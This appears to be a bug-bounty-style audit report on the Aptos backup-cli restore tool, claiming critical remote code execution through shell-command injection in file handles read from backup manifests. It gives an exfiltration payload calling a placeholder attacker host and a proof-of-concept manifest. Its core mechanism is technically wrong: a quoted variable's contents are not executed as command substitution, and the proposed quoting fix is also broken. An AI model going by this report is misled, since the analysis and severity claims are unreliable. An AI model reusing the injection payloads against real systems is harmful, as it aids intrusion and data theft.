# Audit Report

## Title
Command Injection via Unvalidated FileHandle URIs in Backup/Restore System

## Summary
The `FileHandle` type alias in the backup-cli storage module lacks input validation, allowing attackers with write access to backup storage to inject malicious shell commands that execute during restore operations. This violates the system's security model where backup storage is explicitly treated as potentially untrusted.

## Finding Description

The backup system defines `FileHandle` as a simple `String` type alias without any validation or sanitization: [1](#0-0) 

When using the `CommandAdapter` storage backend, `FileHandle` values are passed as environment variables to shell commands. In the sample configurations, these variables are interpolated inside double quotes: [2](#0-1) [3](#0-2) 

The command execution happens via bash without sanitization: [4](#0-3) 

**Attack Path:**

1. Attacker gains write access to backup storage (S3/GCS bucket) - the system explicitly treats this as untrusted by using cryptographic verification with trusted waypoints
2. Attacker modifies a manifest JSON file to include a malicious `FileHandle` like: `normal/path$(curl attacker.com/exfiltrate?data=$(whoami))`
3. Victim runs a restore operation that deserializes the manifest: [5](#0-4) 

4. The malicious `FileHandle` from the manifest chunk is used to read data: [6](#0-5) 

5. This passes the `FileHandle` to `open_for_read()`: [7](#0-6) 

6. The `FILE_HANDLE` environment variable is set and the command executes, triggering command substitution inside the double quotes

The system uses cryptographic verification to validate backup content integrity, but this validation happens **after** the files are read. The command injection occurs **before** any cryptographic checks, bypassing the security model entirely.

## Impact Explanation

**Critical Severity - Remote Code Execution**

This vulnerability allows arbitrary command execution on any node performing backup restore operations. According to the Aptos bug bounty criteria, "Remote Code Execution on validator node" is classified as Critical Severity with a bounty range up to $1,000,000.

The backup-cli tool is part of the validator infrastructure for disaster recovery and state synchronization. If restore operations run on validator nodes or infrastructure with privileged access, successful exploitation grants the attacker:

- Full control over the compromised node
- Access to validator keys and sensitive data
- Ability to manipulate blockchain state during restore
- Potential for persistent backdoor installation

The cryptographic verification system (trusted waypoints, signature verification) is designed to allow restores from untrusted backup storage, but this command injection bypass renders those protections useless.

## Likelihood Explanation

**High Likelihood**

The attack requires:
1. Write access to backup storage (S3/GCS bucket)
2. Knowledge of the manifest JSON format
3. A restore operation to be triggered

Many production deployments use cloud storage with potentially weak access controls. Attackers who compromise backup storage credentials (via misconfigured IAM policies, leaked credentials, or cloud account takeover) can immediately exploit this vulnerability.

The sample configurations provided in the codebase use this exact vulnerable pattern, indicating real-world deployments likely follow the same approach.

## Recommendation

Implement strict validation and sanitization for `FileHandle` values:

**1. Define allowed FileHandle format:**
```rust
// In storage/backup/backup-cli/src/storage/mod.rs
pub struct FileHandle(String);

impl FileHandle {
    const PATTERN: &'static str = r"\A[a-zA-Z0-9/_.\-]+\z";
    
    pub fn new(value: String) -> Result<Self> {
        static RE: Lazy<Regex> = Lazy::new(|| Regex::new(FileHandle::PATTERN).unwrap());
        ensure!(
            RE.is_match(&value),
            "Invalid FileHandle format: {}. Only alphanumeric, /, _, ., and - allowed",
            value
        );
        ensure!(
            !value.contains(".."),
            "FileHandle cannot contain path traversal sequences: {}",
            value
        );
        Ok(Self(value))
    }
}
```

**2. Use single quotes or proper escaping in shell commands:**
Update sample configs to use single quotes which prevent variable expansion:
```yaml
open_for_read: |
  gsutil -q cp "gs://$BUCKET/$SUB_DIR/'$FILE_HANDLE'" - | gzip -cd
```

Or better yet, avoid shell interpolation entirely by passing the path as a direct argument rather than embedding in the command string.

**3. Add validation on deserialization:**
Implement custom `Deserialize` for `FileHandle` to validate during manifest loading.

## Proof of Concept

Create a malicious manifest file `malicious_manifest.json`:
```json
{
  "first_epoch": 0,
  "last_epoch": 0,
  "waypoints": [...],
  "chunks": [{
    "first_epoch": 0,
    "last_epoch": 0,
    "ledger_infos": "epoch_0/ledger_infos$(touch /tmp/pwned.txt)"
  }]
}
```

Upload this to backup storage and trigger a restore operation:
```bash
# The restore command will execute the injected command
aptos-debugger aptos-db restore epoch-ending \
  --epoch-ending-manifest "malicious_manifest.json" \
  --target-db-dir /tmp/restore
```

The command `touch /tmp/pwned.txt` will execute when the `open_for_read` command processes the malicious FileHandle, creating the file `/tmp/pwned.txt` as proof of code execution.

More severe payloads could exfiltrate validator keys, install backdoors, or manipulate the restored state.

## Notes

This vulnerability affects both production restore operations and any automated backup verification systems. The LocalFs backend also has a related path traversal vulnerability at: [8](#0-7) 

However, the command injection in CommandAdapter is more severe as it provides full RCE rather than just file system access.

### Citations

**File:** storage/backup/backup-cli/src/storage/mod.rs (L36-41)
```rust
/// URI pointing to a file in a backup storage, like "s3:///bucket/path/file".
/// These are created by the storage when `create_for_write()`, stored in manifests by the backup
/// controller, and passed back to the storage when `open_for_read()` by the restore controller
/// to retrieve a file referred to in the manifest.
pub type FileHandle = String;
pub type FileHandleRef = str;
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/sample_configs/gcp.sample.yaml (L19-21)
```yaml
  open_for_read: |
    # route file handle content to stdout
    gsutil -q cp "gs://$BUCKET/$SUB_DIR/$FILE_HANDLE" - | gzip -cd
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/sample_configs/s3.sample.yaml (L19-21)
```yaml
  open_for_read: |
    # route file handle content to stdout
    aws s3 cp "s3://$BUCKET/$SUB_DIR/$FILE_HANDLE" - | gzip -cd
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/command.rs (L68-79)
```rust
        let mut cmd = tokio::process::Command::new("bash");
        cmd.args(["-c", &command.cmd_str]);
        cmd.stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::inherit());
        for v in command
            .config_env_vars
            .iter()
            .chain(command.param_env_vars.iter())
        {
            cmd.env(&v.key, &v.value);
        }
```

**File:** storage/backup/backup-cli/src/backup_types/epoch_ending/restore.rs (L80-83)
```rust
    async fn preheat_impl(&self) -> Result<EpochEndingRestorePreheatData> {
        let manifest: EpochEndingBackup =
            self.storage.load_json_file(&self.manifest_handle).await?;
        manifest.verify()?;
```

**File:** storage/backup/backup-cli/src/backup_types/epoch_ending/restore.rs (L160-165)
```rust
    async fn read_chunk(
        &self,
        file_handle: &FileHandleRef,
    ) -> Result<Vec<LedgerInfoWithSignatures>> {
        let mut file = self.storage.open_for_read(file_handle).await?;
        let mut chunk = vec![];
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/mod.rs (L114-124)
```rust
    async fn open_for_read(
        &self,
        file_handle: &FileHandleRef,
    ) -> Result<Box<dyn AsyncRead + Send + Unpin>> {
        let child = self
            .cmd(&self.config.commands.open_for_read, vec![
                EnvVar::file_handle(file_handle.to_string()),
            ])
            .spawn()?;
        Ok(Box::new(child.into_data_source()))
    }
```

**File:** storage/backup/backup-cli/src/storage/local_fs/mod.rs (L98-109)
```rust
    async fn open_for_read(
        &self,
        file_handle: &FileHandleRef,
    ) -> Result<Box<dyn AsyncRead + Send + Unpin>> {
        let path = self.dir.join(file_handle);
        let file = OpenOptions::new()
            .read(true)
            .open(&path)
            .await
            .err_notes(&path)?;
        Ok(Box::new(file))
    }
```
